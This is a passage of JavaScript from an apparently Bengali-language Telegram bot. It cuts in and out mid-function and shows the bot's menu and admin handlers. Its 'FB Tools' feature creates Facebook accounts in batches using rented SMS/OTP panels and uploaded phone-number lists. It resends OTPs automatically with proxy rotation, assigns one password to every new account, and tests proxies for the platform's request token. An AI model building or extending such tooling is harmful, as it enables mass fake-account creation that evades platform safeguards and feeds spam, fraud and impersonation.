      promptSessions.set(uid, { kind: 'awaiting_fbtools_otp_resends' });
      await sendMessage(
        chatId,
        `🔁 <b>অটো OTP রিসেন্ড সংখ্যা (১–১০)</b>\nপ্রতি অ্যাকাউন্টে সর্বোচ্চ কতবার প্রক্সি রোটেশনসহ OTP রিসেন্ড করবে তা লিখুন (<code>১ থেকে ১০</code>):`,
        { inline_keyboard: [[btnBad('❌ বাতিল', 'menu:fb_tools')]] }
      );
      return;
    }

    if (data.startsWith('fbtools:src:')) {
      const nextSrc = data.slice('fbtools:src:'.length);
      if (['2oo9', 'lamix', 'pool', 'custom'].includes(nextSrc)) {
        writeUserConfig(uid, { fb_tools_source: nextSrc });
      }
      await renderFbToolsMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'fbtools:setpw') {
      promptSessions.set(uid, { kind: 'awaiting_fbtools_pw' });
      await sendMessage(
        chatId,
        `🔐 <b>পাসওয়ার্ড সেট / পরিবর্তন করুন</b>\n${DIVIDER}\nনতুন সব অ্যাকাউন্টে যে পাসওয়ার্ড বসবে তা লিখুন (কমপক্ষে <code>৬</code> অক্ষর):`,
        { inline_keyboard: [[btnBad('❌ বাতিল', 'menu:fb_tools')]] }
      );
      return;
    }

    if (data === 'fbtools:viewpw') {
      const pw = resolveFbToolsPassword(readUserConfig(uid));
      await sendMessage(
        chatId,
        `👁 <b>সেভ করা পাসওয়ার্ড</b>\n${DIVIDER}\n<code>${pw ? escapeHtml(pw) : '(এখনো সেট করা হয়নি)'}</code>`,
        { inline_keyboard: [[btnNav('⬅️ FB Tools মেনু', 'menu:fb_tools')]] }
      );
      return;
    }

    if (data === 'fbtools:set_2oo9_keys' || data === 'fbtools:reset_2oo9_keys' || data === 'fbtools:set_lamix') {
      if (!isAdmin) {
        await sendMessage(chatId, '⛔ API Key শুধুমাত্র অ্যাডমিন প্যানেল থেকে সেট করা যাবে। ইউজাররা সরাসরি প্রস্তুত সার্ভার ব্যবহার করতে পারবেন।', {
          inline_keyboard: [[btnNav('⬅️ FB Tools মেনু', 'menu:fb_tools')]],
        });
        return;
      }
      await renderAdminApiKeysMenu(chatId, msgId);
      return;
    }

    if (data === 'fbtools:lamix_status') {
      if (!isAdmin) {
        await renderFbToolsServerStatus(chatId, uid, msgId);
        return;
      }
      await renderFbToolsLamixStatus(chatId, uid, msgId);
      return;
    }

    if (data.startsWith('fbtools:2oo9_ranges:')) {
      const page = Number(data.slice('fbtools:2oo9_ranges:'.length)) || 0;
      await renderFbTools2oo9Ranges(chatId, uid, page, false, msgId);
      return;
    }

    if (data.startsWith('fbtools:2oo9_ranges_ref:')) {
      const page = Number(data.slice('fbtools:2oo9_ranges_ref:'.length)) || 0;
      await renderFbTools2oo9Ranges(chatId, uid, page, true, msgId);
      return;
    }

    if (data.startsWith('fbtools:pick2oo9:')) {
      const parts = data.slice('fbtools:pick2oo9:'.length).split(':');
      const idx = Number(parts[1]);
      const cached = fbTools2oo9RangeCache.get(uid);
      const picked = Number.isInteger(idx) && cached?.ranges?.[idx] ? cached.ranges[idx] : null;
      if (picked) {
        writeUserConfig(uid, {
          fb_tools_source: '2oo9',
          fb_tools_2oo9_range: picked.id,
          fb_tools_2oo9_range_label: `${picked.flag} ${picked.countryName} (${picked.range})`,
          fb_tools_2oo9_sid: picked.sid || 'facebook',
        });
      }
      await renderFbToolsCountPicker(chatId, uid, msgId);
      return;
    }

    if (data.startsWith('fbtools:ranges:')) {
      const page = Number(data.slice('fbtools:ranges:'.length)) || 0;
      await renderFbToolsLamixRanges(chatId, uid, page, false, msgId);
      return;
    }

    if (data.startsWith('fbtools:ranges_ref:')) {
      const page = Number(data.slice('fbtools:ranges_ref:'.length)) || 0;
      await renderFbToolsLamixRanges(chatId, uid, page, true, msgId);
      return;
    }

    if (data.startsWith('fbtools:pickrange:')) {
      const parts = data.slice('fbtools:pickrange:'.length).split(':');
      const idx = Number(parts[1]);
      const cached = fbToolsLamixRangeCache.get(uid);
      const picked = Number.isInteger(idx) && cached?.ranges?.[idx] ? cached.ranges[idx] : null;
      if (picked) {
        writeUserConfig(uid, {
          fb_tools_source: 'lamix',
          fb_tools_lamix_range: picked.id,
          fb_tools_lamix_label: picked.range,
          fb_tools_lamix_prefix: picked.clean_range || '',
        });
      }
      await renderFbToolsCountPicker(chatId, uid, msgId);
      return;
    }

    if (data.startsWith('fbtools:countries:')) {
      const page = Number(data.slice('fbtools:countries:'.length)) || 0;
      await renderFbToolsPoolCountries(chatId, uid, page, msgId);
      return;
    }

    if (data.startsWith('fbtools:pickcountry:')) {
      const cid = Number(data.slice('fbtools:pickcountry:'.length));
      if (Number.isFinite(cid)) {
        writeUserConfig(uid, { fb_tools_source: 'pool', fb_tools_country_id: cid });
      }
      await renderFbToolsCountPicker(chatId, uid, msgId);
      return;
    }

    if (data === 'fbtools:custom_count') {
      promptSessions.set(uid, { kind: 'awaiting_fbtools_count' });
      await sendMessage(
        chatId,
        `🔢 <b>কাস্টম অ্যাকাউন্ট সংখ্যা (১–১৫)</b>\nএকসাথে কতটি অ্যাকাউন্ট বানাতে চান তা সংখ্যায় লিখুন (<code>১ থেকে ১৫</code>):`,
        { inline_keyboard: [[btnBad('❌ বাতিল', 'menu:fb_tools')]] }
      );
      return;
    }

    if (data === 'fbtools:custom_nums') {
      promptSessions.set(uid, { kind: 'awaiting_fbtools_custom_nums' });
      await sendMessage(
        chatId,
        `📝 <b>নিজের নাম্বার পেস্ট বা ফাইল আপলোড করুন</b>\n${DIVIDER}\nফোন নাম্বারগুলো নিচে পেস্ট করুন (প্রতি লাইনে ১টি) অথবা <code>.txt</code> ফাইল পাঠান:`,
        { inline_keyboard: [[btnBad('❌ বাতিল', 'menu:fb_tools')]] }
      );
      return;
    }

    if (data.startsWith('fbtools:start:')) {
      const cnt = Math.max(1, Math.min(15, Number(data.slice('fbtools:start:'.length)) || 1));
      await startFbToolsBatch(chatId, user, { count: cnt });
      return;
    }

    if (data === 'fbtools:stop_watch') {
      fbToolsWatchAbort.set(String(uid), true);
      await sendMessage(chatId, '🛑 OTP ওয়াচার বন্ধ করা হচ্ছে...');
      return;
    }

    if (data === 'fbtools:rerun') {
      const lastCfg = fbToolsLastBatchConfig.get(uid);
      if (!lastCfg) {
        await renderFbToolsMenu(chatId, uid, msgId);
        return;
      }
      await startFbToolsBatch(chatId, user, {
        source: lastCfg.source,
        count: lastCfg.count,
        rangeId: lastCfg.rangeId,
        rangeLabel: lastCfg.rangeLabel,
        sid: lastCfg.sid,
        countryId: lastCfg.countryId,
      });
      return;
    }

    if (data === 'fbtools:change_source') {
      const cfgNow = readUserConfig(uid);
      if (cfgNow.fb_tools_source === 'lamix') {
        await renderFbToolsLamixRanges(chatId, uid, 0, true, msgId);
      } else if (cfgNow.fb_tools_source === 'pool') {
        await renderFbToolsPoolCountries(chatId, uid, 0, msgId);
      } else if (cfgNow.fb_tools_source === '2oo9') {
        await renderFbTools2oo9Ranges(chatId, uid, 0, true, msgId);
      } else {
        await renderFbToolsMenu(chatId, uid, msgId);
      }
      return;
    }

    if (data === 'menu:stop') {
      const run = activeRuns.get(uid);
      if (run?.running) {
        run.abortRequested = true;
        await sendMessage(chatId, '🛑 Stopping your active batch run...', {
          inline_keyboard: [[btnNav('⬅️ Main Menu', 'menu:home')]],
        });
      } else {
        await sendMessage(chatId, 'ℹ️ No active batch run is currently running.', {
          inline_keyboard: [[btnNav('⬅️ Main Menu', 'menu:home')]],
        });
      }
      return;
    }

    if (data.startsWith('admin:')) {
      if (!isAdmin) {
        await sendMessage(chatId, '⛔ Admin access only.', {
          inline_keyboard: [[btnNav('⬅️ Main Menu', 'menu:home')]],
        });
        return;
      }
      if (data === 'admin:home') {
        promptSessions.delete(uid);
        await renderAdminHome(chatId, msgId);
        return;
      }
      if (data === 'admin:apikeys') {
        promptSessions.delete(uid);
        await renderAdminApiKeysMenu(chatId, msgId);
        return;
      }
      if (data === 'admin:apikey_set_lamix') {
        promptSessions.set(uid, { kind: 'admin_awaiting_lamix_token' });
        await sendMessage(
          chatId,
          `🔑 <b>SET GLOBAL LAMIX API v1 TOKEN</b>\n${DIVIDER}\nPaste your Lamix Bearer Token from <code>panel.lamix.org</code> (send <code>-</code> to clear):`,
          { inline_keyboard: [[btnBad('❌ Cancel', 'admin:apikeys')]] }
        );
        return;
      }
      if (data === 'admin:apikey_clr_lamix') {
        writeSettings({ globalLamixToken: '', globalLamixCleared: true, _apiKeysMigrated: true });
        fbToolsLamixRangeCache.clear();
        await renderAdminApiKeysMenu(chatId, msgId);
        return;
      }
      if (data === 'admin:apikey_set_voltex') {
        promptSessions.set(uid, { kind: 'admin_awaiting_voltex_keys' });
        await sendMessage(
          chatId,
          `🔑 <b>SET GLOBAL VOLTEX / 2oo9 KEYS (mauthapi)</b>\n${DIVIDER}\nPaste 1 or more API keys (one per line), send <code>default</code> to restore built-in default, or send <code>-</code> to disable:`,
          { inline_keyboard: [[btnBad('❌ Cancel', 'admin:apikeys')]] }
        );
        return;
      }
      if (data === 'admin:apikey_clr_voltex') {
        writeSettings({ globalVoltexKeys: [], globalVoltexDisabled: true, _apiKeysMigrated: true });
        fbTools2oo9RangeCache.clear();
        await renderAdminApiKeysMenu(chatId, msgId);
        return;
      }
      if (data === 'admin:apikey_set_voltex_url') {
        promptSessions.set(uid, { kind: 'admin_awaiting_voltex_url' });
        await sendMessage(
          chatId,
          `🌐 <b>SET VOLTEX / 2oo9 API BASE URL</b>\n${DIVIDER}\nSend full base URL (or <code>default</code> for <code>${escapeHtml(HBX_API_2OO9_BASE)}</code>):`,
          { inline_keyboard: [[btnBad('❌ Cancel', 'admin:apikeys')]] }
        );
        return;
      }
      if (data === 'admin:apikey_test') {
        const res = await checkHbxRemoteStatus(resolveFbTools2oo9Keys(), resolveFbToolsLamixToken(), resolveFbToolsVoltexUrl());
        await sendMessage(
          chatId,
          [
            `🧪 <b>ADMIN API KEY &amp; SERVER DIAGNOSTICS</b>`,
            DIVIDER,
            `🌐 <b>Voltex / 2oo9:</b> ${res.api2oo9Ok ? `🟢 <b>CONNECTED</b> (<code>${res.api2oo9RangesCount}</code> FB ranges)` : `🔴 <code>${escapeHtml(res.api2oo9Err || 'Disconnected')}</code>`}`,
            `📡 <b>Lamix SMS:</b> ${res.lamixOk === null ? '⚪ Not configured' : res.lamixOk ? `🟢 <b>CONNECTED</b> (<code>${res.lamixRangesCount}</code> ranges)` : `🔴 <code>${escapeHtml(res.lamixErr || 'Disconnected')}</code>`}`,
            `🧩 <b>OTP API Panels:</b> <code>${res.activePanelsCnt}</code> active`,
          ].join('\n'),
          { inline_keyboard: [[btnNav('⬅️ API Keys Vault', 'admin:apikeys')]] }
        );
        return;
      }
      if (data === 'admin:users' || data.startsWith('admin:users:')) {
        promptSessions.delete(uid);
        const partsU = data.split(':');
        const rawFilter = partsU[2] || 'all';
        const filter = ['all', 'top', 'active_today', 'approved', 'pending', 'blocked'].includes(rawFilter) ? rawFilter : 'all';
        const page = Math.max(0, Number(partsU[3] || 0) || 0);
        await renderAdminUsersList(chatId, filter, msgId, page);
        return;
      }
      if (data === 'admin:ufind') {
        promptSessions.set(uid, { kind: 'admin_awaiting_find_user' });
        await sendMessage(chatId, `🔍 <b>FIND USER</b>\nEnter Telegram User ID, <code>@username</code>, or name:`, {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:users')]],
        });
        return;
      }
      if (data === 'admin:approve_all_pending') {
        const map = readUsersMap();
        let cnt = 0;
        for (const u of Object.values(map)) {
          if (u.status === 'pending') {
            u.status = 'approved';
            cnt += 1;
            await sendMessage(u.id, `✅ <b>Your ${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)} access has been approved!</b>`, {
              inline_keyboard: [[btnOk('🚀 Open Tool Menu', 'menu:home')]],
            });
          }
        }
        writeUsersMap(map);
        pushBotLog(`Admin bulk-approved ${cnt} pending users`);
        await sendMessage(chatId, `✅ Approved <code>${cnt}</code> pending users.`);
        await renderAdminUsersList(chatId, 'all');
        return;
      }
      if (data === 'admin:reset_all_quotas') {
        const map = readUsersMap();
        let cnt = 0;
        for (const u of Object.values(map)) {
          if (u.usedToday > 0) {
            u.usedToday = 0;
            cnt += 1;
          }
        }
        writeUsersMap(map);
        pushBotLog(`Admin reset today quotas for ${cnt} users`);
        await sendMessage(chatId, `🔄 Reset today's quota usage for <code>${cnt}</code> users.`);
        await renderAdminUsersList(chatId, 'all');
        return;
      }
      if (data === 'admin:brand') {
        promptSessions.delete(uid);
        await renderAdminBrandMenu(chatId, msgId);
        return;
      }
      if (data === 'admin:set_brand') {
        promptSessions.set(uid, { kind: 'admin_awaiting_brand' });
        await sendMessage(chatId, `🏷 <b>EDIT BRAND NAME</b>\nSend the new Brand Name (current: <code>${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)}</code>):`, {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:brand')]],
        });
        return;
      }
      if (data === 'admin:set_owner') {
        promptSessions.set(uid, { kind: 'admin_awaiting_owner' });
        await sendMessage(chatId, `👑 <b>EDIT OWNER / ADMIN LINK</b>\nSend username or link (e.g. <code>@CODINGJAMES_X</code> or <code>https://t.me/CODINGJAMES_X</code>):`, {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:brand')]],
        });
        return;
      }
      if (data === 'admin:set_channel') {
        promptSessions.set(uid, { kind: 'admin_awaiting_channel' });
        await sendMessage(chatId, `📢 <b>EDIT OFFICIAL CHANNEL URL</b>\nSend channel link or handle (e.g. <code>https://t.me/EarnAirdropX</code>):`, {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:brand')]],
        });
        return;
      }
      if (data === 'admin:test_channel') {
        const handle = getChannelHandle(st.channelUrl);
        const res = await tgCall('getChat', { chat_id: handle });
        const me = botInfo?.id ? await tgCall('getChatMember', { chat_id: handle, user_id: botInfo.id }) : null;
        const botStatus = me?.ok ? me.result?.status : 'not admin / unreachable';
        await sendMessage(
          chatId,
          [
            `🧪 <b>CHANNEL BOT CHECK</b>`,
            DIVIDER,
            `📢 <b>Target:</b> <code>${escapeHtml(handle)}</code>`,
            `🔎 <b>Channel Lookup:</b> ${res.ok ? `🟢 ${escapeHtml(res.result?.title || handle)}` : `🔴 ${escapeHtml(res.description || 'Not found')}`}`,
            `🤖 <b>Bot Role in Channel:</b> <code>${escapeHtml(String(botStatus))}</code>`,
            ``,
            `<i>For Force Join verification to work, make @${escapeHtml(botInfo?.username || 'bot')} an Admin in ${escapeHtml(handle)}.</i>`,
          ].join('\n'),
          { inline_keyboard: [[btnNav('⬅️ Brand & Channel', 'admin:brand')]] }
        );
        return;
      }
      if (data === 'admin:settings') {
        promptSessions.delete(uid);
        await renderAdminSettings(chatId, msgId);
        return;
      }
      if (data === 'admin:toggle_approval') {
        writeSettings({ requireApproval: !readSettings().requireApproval });
        await renderAdminSettings(chatId, msgId);
        return;
      }
      if (data === 'admin:toggle_sharepx') {
        writeSettings({ shareGlobalProxies: !readSettings().shareGlobalProxies });
        await renderAdminSettings(chatId, msgId);
        return;
      }
      if (data === 'admin:toggle_maint') {
        const next = !readSettings().maintenanceMode;
        writeSettings({ maintenanceMode: next });
        pushBotLog(`Admin toggled maintenance mode -> ${next ? 'ON' : 'OFF'}`);
        await renderAdminHome(chatId, msgId);
        return;
      }
      if (data === 'admin:toggle_forcejoin') {
        const next = !readSettings().requireChannelJoin;
        writeSettings({ requireChannelJoin: next });
        pushBotLog(`Admin toggled channel force join -> ${next ? 'ON' : 'OFF'}`);
        await renderAdminBrandMenu(chatId, msgId);
        return;
      }
      if (data === 'admin:cycle_def_engine') {
        const order = ['hybrid', 'limited', 'classic'];
        const cur = order.indexOf(readSettings().defaultEngineMode || 'hybrid');
        const next = order[(cur + 1) % order.length];
        writeSettings({ defaultEngineMode: next });
        await renderAdminSettings(chatId, msgId);
        return;
      }
      if (data === 'admin:toggle_def_gql') {
        writeSettings({ defaultPrecheckGql: readSettings().defaultPrecheckGql === false });
        await renderAdminSettings(chatId, msgId);
        return;
      }
      if (data === 'admin:sync_defaults') {
        const stNow = readSettings();
        const users = Object.values(readUsersMap());
        for (const u of users) {
          writeUserConfig(u.id, {
            engine_mode: stNow.defaultEngineMode || 'hybrid',
            precheck_gql: stNow.defaultPrecheckGql !== false,
          });
        }
        await sendMessage(
          chatId,
          `♻️ Synced Engine (<code>${escapeHtml((stNow.defaultEngineMode || 'hybrid').toUpperCase())}</code>) & GQL Check (${stNow.defaultPrecheckGql !== false ? 'ON' : 'OFF'}) to <code>${users.length}</code> users.`,
          { inline_keyboard: [[btnNav('⚙️ Back to Policy', 'admin:settings')]] }
        );
        return;
      }
      if (data === 'admin:set_default_limit') {
        promptSessions.set(uid, { kind: 'admin_awaiting_default_limit' });
        await sendMessage(chatId, '🎯 <b>SET DEFAULT QUOTA</b>\nEnter new default daily quota limit for users (e.g. <code>25</code> or <code>100</code>):', {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:settings')]],
        });
        return;
      }
      if (data === 'admin:set_valid_time') {
        promptSessions.set(uid, { kind: 'admin_awaiting_valid_time' });
        await sendMessage(
          chatId,
          `⏱ <b>SET NUMBER VALID TIME</b>\nCurrent: <code>${readSettings().numberValidMinutes || 10} minutes</code>\nEnter new valid window in minutes (<code>1–10080</code>):`,
          { inline_keyboard: [[btnBad('❌ Cancel', 'admin:countries')]] }
        );
        return;
      }
      if (data === 'admin:countries') {
        promptSessions.delete(uid);
        await renderAdminCountries(chatId, msgId);
        return;
      }
      if (data === 'admin:country_add') {
        promptSessions.set(uid, { kind: 'admin_awaiting_country_name' });
        await sendMessage(
          chatId,
          `➕ <b>ADD COUNTRY TO POOL</b>\nSend the Country Name (e.g. <code>Nigeria +234</code>, <code>Bangladesh +880</code>):`,
          { inline_keyboard: [[btnBad('❌ Cancel', 'admin:countries')]] }
        );
        return;
      }
      if (data === 'admin:country_upload') {
        await renderAdminCountryPickList(chatId, 'upload', msgId);
        return;
      }
      if (data.startsWith('admin:country_upload:')) {
        const cid = Number(data.slice('admin:country_upload:'.length));
        const c = findCountryById(cid);
        if (!c) {
          await renderAdminCountries(chatId, msgId);
          return;
        }
        promptSessions.set(uid, { kind: 'admin_awaiting_country_numbers', countryId: cid });
        await sendMessage(
          chatId,
          [
            `📤 <b>UPLOAD NUMBERS → ${escapeHtml(c.name)}</b>`,
            DIVIDER,
            `Upload a <code>.txt</code>, <code>.csv</code>, or <code>.xlsx</code> file (up to <b>10 MB</b> / <b>100,000</b> numbers), OR paste phone numbers directly below:`,
          ].join('\n'),
          { inline_keyboard: [[btnBad('❌ Cancel', 'admin:countries')]] }
        );
        return;
      }
      if (data === 'admin:country_reset') {
        await renderAdminCountryPickList(chatId, 'reset', msgId);
        return;
      }
      if (data.startsWith('admin:country_reset:')) {
        const cid = Number(data.slice('admin:country_reset:'.length));
        const c = findCountryById(cid);
        if (!c) {
          await renderAdminCountries(chatId, msgId);
          return;
        }
        await sendMessage(
          chatId,
          `⚠️ Reset all numbers for <b>${escapeHtml(c.name)}</b>? This deletes all unused and used numbers in this country.`,
          {
            inline_keyboard: [
              [btnBad('🗑 Confirm Reset', `admin:country_resetconfirm:${cid}`), btnNav('❌ Cancel', 'admin:countries')],
            ],
          }
        );
        return;
      }
      if (data.startsWith('admin:country_resetconfirm:')) {
        const cid = Number(data.slice('admin:country_resetconfirm:'.length));
        const res = resetAdminCountryNumbers(cid);
        await sendMessage(chatId, res.ok ? `🔄 Reset <code>${res.deleted}</code> numbers from <b>${escapeHtml(res.country.name)}</b>.` : '❌ Country not found.');
        await renderAdminCountries(chatId);
        return;
      }
      if (data === 'admin:country_del') {
        await renderAdminCountryPickList(chatId, 'del', msgId);
        return;
      }
      if (data.startsWith('admin:country_del:')) {
        const cid = Number(data.slice('admin:country_del:'.length));
        const c = findCountryById(cid);
        if (!c) {
          await renderAdminCountries(chatId, msgId);
          return;
        }
        await sendMessage(
          chatId,
          `⚠️ Permanently delete country <b>${escapeHtml(c.name)}</b> and all of its numbers?`,
          {
            inline_keyboard: [
              [btnBad('🗑 Confirm Delete', `admin:country_delconfirm:${cid}`), btnNav('❌ Cancel', 'admin:countries')],
            ],
          }
        );
        return;
      }
      if (data.startsWith('admin:country_delconfirm:')) {
        const cid = Number(data.slice('admin:country_delconfirm:'.length));
        const res = deleteAdminCountry(cid);
        await sendMessage(chatId, res.ok ? `🗑 Deleted <b>${escapeHtml(res.country.name)}</b> (${res.removedNumbers} numbers removed).` : '❌ Country not found.');
        await renderAdminCountries(chatId);
        return;
      }
      if (data === 'admin:panels') {
        promptSessions.delete(uid);
        await renderAdminPanels(chatId, msgId);
        return;
      }
      if (data === 'admin:panel_add') {
        promptSessions.set(uid, { kind: 'admin_panel_add_name' });
        await sendMessage(
          chatId,
          `🔌 <b>ADD API PANEL (1/4)</b>\n\nSend a short name for this OTP API Panel (e.g. <code>SMS Panel 1</code>):`,
          { inline_keyboard: [[btnBad('❌ Cancel', 'admin:panels')]] }
        );
        return;
      }
      if (data.startsWith('admin:panel_view:')) {
        promptSessions.delete(uid);
        const pid = Number(data.slice('admin:panel_view:'.length));
        await renderAdminPanelDetail(chatId, pid, msgId);
        return;
      }
      if (data.startsWith('admin:panel_toggle:')) {
        const pid = Number(data.slice('admin:panel_toggle:'.length));
        const p = findPanelById(pid);
        if (p) {
          updatePanelById(pid, { active: p.active === false });
          forgetPanelRuntimeState(pid);
        }
        await renderAdminPanelDetail(chatId, pid, msgId);
        return;
      }
      if (data.startsWith('admin:panel_last:')) {
        const pid = Number(data.slice('admin:panel_last:'.length));
        const p = findPanelById(pid);
        if (!p) {
          await renderAdminPanels(chatId, msgId);
          return;
        }
        const rows = await panelFetchSms(p, 1, true);
        if (rows === null) {
          await sendMessage(chatId, `❌ <b>Auth / API Error:</b> <code>${escapeHtml(findPanelById(pid)?.api_last_error || 'Authentication failed')}</code>`, {
            inline_keyboard: [[btnNav('⬅️ Back to Panel', `admin:panel_view:${pid}`)]],
          });
          return;
        }
        if (!rows || rows.length === 0) {
          await sendMessage(chatId, `ℹ️ No SMS messages found on <b>${escapeHtml(p.name)}</b> right now.`, {
            inline_keyboard: [[btnNav('⬅️ Back to Panel', `admin:panel_view:${pid}`)]],
          });
          return;
        }
        await sendMessage(chatId, formatLastSmsHtml(p.name, rows), {
          inline_keyboard: [[btnOk('🔄 Refresh', `admin:panel_last:${pid}`), btnNav('⬅️ Back to Panel', `admin:panel_view:${pid}`)]],
        });
        return;
      }
      if (data.startsWith('admin:panel_raw:')) {
        const pid = Number(data.slice('admin:panel_raw:'.length));
        const p = findPanelById(pid);
        if (!p) {
          await renderAdminPanels(chatId, msgId);
          return;
        }
        const rawRow = await panelFetchRawRow(p);
        if (rawRow === null) {
          await sendMessage(chatId, '❌ Failed to fetch raw data (check auth/URL).', {
            inline_keyboard: [[btnNav('⬅️ Back to Panel', `admin:panel_view:${pid}`)]],
          });
          return;
        }
        let body = '';
        if (Array.isArray(rawRow)) {
          body = rawRow.length === 0
            ? '<i>Empty array returned.</i>'
            : rawRow.map((val, idx) => `<code>[${idx + 1}]</code> ${escapeHtml(String(val ?? '').slice(0, 120))}`).join('\n');
        } else if (rawRow && typeof rawRow === 'object') {
          body = Object.entries(rawRow).map(([k, v]) => `<code>${escapeHtml(k)}</code>: ${escapeHtml((typeof v === 'object' ? JSON.stringify(v) : String(v ?? '')).slice(0, 120))}`).join('\n');
        } else {
          body = `<code>${escapeHtml(String(rawRow || 'Empty'))}</code>`;
        }
        if (body.length > 3400) body = `${body.slice(0, 3400)}\n<i>...(truncated)</i>`;
        await sendMessage(chatId, `📊 <b>RAW DATA • ${escapeHtml(p.name)}</b>\n${DIVIDER}\n${body}`, {
          inline_keyboard: [[btnNav('⬅️ Back to Panel', `admin:panel_view:${pid}`)]],
        });
        return;
      }
      if (data.startsWith('admin:panel_auth:')) {
        const pid = Number(data.slice('admin:panel_auth:'.length));
        await renderAdminPanelAuthMenu(chatId, pid, msgId);
        return;
      }
      if (data.startsWith('admin:panel_setauth:')) {
        const rest = data.slice('admin:panel_setauth:'.length);
        const colonIdx = rest.indexOf(':');
        const pid = Number(rest.slice(0, colonIdx));
        const authType = rest.slice(colonIdx + 1);
        if (['custom_header', 'custom_query', 'post_form', 'post_json'].includes(authType)) {
          promptSessions.set(uid, { kind: 'admin_panel_set_authname', panelId: pid, authType });
          await sendMessage(
            chatId,
            `🔑 <b>ENTER PARAM / HEADER NAME</b>\nAuth Mode: <code>${escapeHtml(authType)}</code>\nSend the header or parameter name (e.g. <code>mauthapi</code> or <code>api_key</code>):`,
            { inline_keyboard: [[btnBad('❌ Cancel', `admin:panel_auth:${pid}`)]] }
          );
          return;
        }
        updatePanelById(pid, { api_auth_type: authType, api_auth_name: '', api_last_error: '' });
        forgetPanelRuntimeState(pid);
        await renderAdminPanelDetail(chatId, pid, msgId);
        return;
      }
      if (data.startsWith('admin:panel_map:')) {
        const pid = Number(data.slice('admin:panel_map:'.length));
        promptSessions.set(uid, { kind: 'admin_panel_set_mapping', panelId: pid });
        await sendMessage(
          chatId,
          [
            `🗺 <b>SET CUSTOM JSON MAPPING</b>`,
            DIVIDER,
            `Send mapping keys separated by <code>;</code> (or send <code>auto</code> to clear):`,
            `<code>rows=data;number=phone;sender=cli;message=sms;time=date;range=country</code>`,
          ].join('\n'),
          { inline_keyboard: [[btnBad('❌ Cancel', `admin:panel_view:${pid}`)]] }
        );
        return;
      }
      if (data.startsWith('admin:panel_cols:')) {
        const pid = Number(data.slice('admin:panel_cols:'.length));
        const p = findPanelById(pid);
        const curNum = (Number.isInteger(p?.number_col_idx) ? p.number_col_idx : 2) + 1;
        promptSessions.set(uid, { kind: 'admin_panel_cols_num', panelId: pid });
        await sendMessage(
          chatId,
          `✏️ <b>EDIT COLUMNS (1/3)</b>\nCurrent Number Col = <code>${curNum}</code>\n\nEnter 1-based column number for <b>Number</b> (e.g. <code>3</code>):`,
          { inline_keyboard: [[btnBad('❌ Cancel', `admin:panel_view:${pid}`)]] }
        );
        return;
      }
      if (data.startsWith('admin:panel_interval:')) {
        const pid = Number(data.slice('admin:panel_interval:'.length));
        promptSessions.set(uid, { kind: 'admin_panel_set_interval', panelId: pid });
        await sendMessage(
          chatId,
          `⏱ <b>SET SCAN INTERVAL</b>\nEnter scan interval in seconds (minimum <code>3</code>, max <code>86400</code>):`,
          { inline_keyboard: [[btnBad('❌ Cancel', `admin:panel_view:${pid}`)]] }
        );
        return;
      }
      if (data.startsWith('admin:panel_del:')) {
        const pid = Number(data.slice('admin:panel_del:'.length));
        const p = findPanelById(pid);
        if (!p) {
          await renderAdminPanels(chatId, msgId);
          return;
        }
        await sendMessage(chatId, `⚠️ Delete API Panel <b>${escapeHtml(p.name)}</b>?`, {
          inline_keyboard: [
            [btnBad('🗑 Confirm Delete', `admin:panel_delconfirm:${pid}`), btnNav('❌ Cancel', `admin:panel_view:${pid}`)],
          ],
        });
        return;
      }
      if (data.startsWith('admin:panel_delconfirm:')) {
        const pid = Number(data.slice('admin:panel_delconfirm:'.length));
        const del = deleteAdminPanel(pid);
        await sendMessage(chatId, del ? `🗑 Deleted API Panel <b>${escapeHtml(del.name)}</b>.` : '❌ Panel not found.');
        await renderAdminPanels(chatId);
        return;
      }
      if (data === 'admin:set_welcome') {
        promptSessions.set(uid, { kind: 'admin_awaiting_welcome' });
        await sendMessage(chatId, '💬 <b>EDIT WELCOME NOTE</b>\nEnter new welcome message note shown to all users:', {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:brand')]],
        });
        return;
      }
      if (data === 'admin:broadcast') {
        promptSessions.set(uid, { kind: 'admin_awaiting_broadcast' });
        await sendMessage(chatId, '📣 <b>BROADCAST ANNOUNCEMENT</b>\nSend the announcement message to broadcast to all approved users:', {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:home')]],
        });
        return;
      }
      if (data === 'admin:proxies') {
        promptSessions.delete(uid);
        await renderAdminGlobalProxies(chatId, msgId);
        return;
      }
      if (data === 'admin:px_add') {
        promptSessions.set(uid, { kind: 'admin_awaiting_global_proxies' });
        await sendMessage(
          chatId,
          `🌐 <b>ADD GLOBAL PROXIES</b>\nSend global proxies (one per line, 9Proxy <code>user:pass:host:port</code>, <code>host:port:user:pass</code>, or <code>http://user:pass@ip:port</code>):`,
          { inline_keyboard: [[btnBad('❌ Cancel', 'admin:proxies')]] }
        );
        return;
      }
      if (data === 'admin:px_test') {
        const list = readGlobalProxies();
        if (list.length === 0) {
          await sendMessage(chatId, 'Global proxy pool is empty.', {
            inline_keyboard: [[btnNav('⬅️ Global Proxies', 'admin:proxies')]],
          });
          return;
        }
        const batchSlice = list.slice(0, 20);
        await sendMessage(chatId, `🧪 Testing <code>${batchSlice.length}</code> global proxies concurrently (15x)...`);
        const results = new Array(batchSlice.length);
        let pIdx = 0;
        await Promise.all(
          Array.from({ length: Math.min(15, batchSlice.length) }, async () => {
            while (true) {
              const idx = pIdx++;
              if (idx >= batchSlice.length) break;
              results[idx] = await testProxyTcp(batchSlice[idx], true);
            }
          })
        );
        const liveCnt = results.filter((r) => r.ok).length;
        const lines = results.map((r, i) => {
          const meta = r.ok
            ? `${r.latencyMs}ms${r.exitIp ? ` • IP ${escapeHtml(r.exitIp)}` : ''}${r.hasLsd ? ' • LSD OK' : ''}`
            : `${r.latencyMs}ms${r.error ? ` • ${escapeHtml(r.error)}` : ''}`;
          return `${i + 1}. ${r.ok ? '✅ LIVE' : '❌ DEAD'} (<code>${meta}</code>)\n    <code>${escapeHtml(r.proxy)}</code>`;
        });
        await sendMessage(
          chatId,
          `🧪 <b>GLOBAL PROXY RESULTS (${liveCnt}/${results.length} LIVE)</b>\n${DIVIDER}\n${lines.join('\n')}`,
          {
            inline_keyboard: [
              [
